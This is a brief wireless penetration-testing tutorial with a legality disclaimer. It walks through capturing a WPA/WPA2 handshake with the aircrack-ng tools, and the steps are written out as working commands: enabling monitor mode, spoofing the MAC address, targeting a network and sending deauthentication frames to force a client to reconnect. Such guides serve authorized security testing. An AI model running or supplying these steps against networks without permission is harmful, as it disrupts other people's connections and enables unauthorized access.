# WPA/WPA2 Handshake Capture Guide

This guide outlines hows to capture a WPA/WPA2 handshake in order to attempt to crack the pre-shared key using a wordlist.

## This guide is for educational purposes only. Unauthorized access to networks is illegal and unethical. Use only on networks you own or have explicit permission to test.

## Tools
- Kali Linux
- External wireless adapter
* airmon-ng - Enables monitor mode for adapter
* airodump-ng - Captures wireless packets and client activity
* aireplay-ng - Sends deauthentication packets to force handshake

  ### Check for adapter
    sudo iwconfig

  ### Enable adapter if disabled.

  ### Bring Down network in adapter
    sudo ifconfig wlan0 down

  ### Terminate running processes
    sudo airmon-ng check kill

  ### Turn monitor mode for adapter
    sudo airmon-ng start wlan0

  ### Spoof MAC address
    sudo macchanger -r wlan0

  ### Determine which networks 5GHz or 2GHz to test
    sudo airodump-ng --band a wlan0

  ### Target a network
    sudo airodump-ng --bssid (Targeted Network MAC) --channel (Targeted Network Channel) --write (txt file, optional) wlan0

  ### Devices talking to network should be listed.

  ### using seperate command target a device, to shut down, in order for it ping for a handshake with network during restart.
    sudo aireplay-ng --deauth 4 -a (Target Network MAC) -c(Target Device MAC) wlan0
  
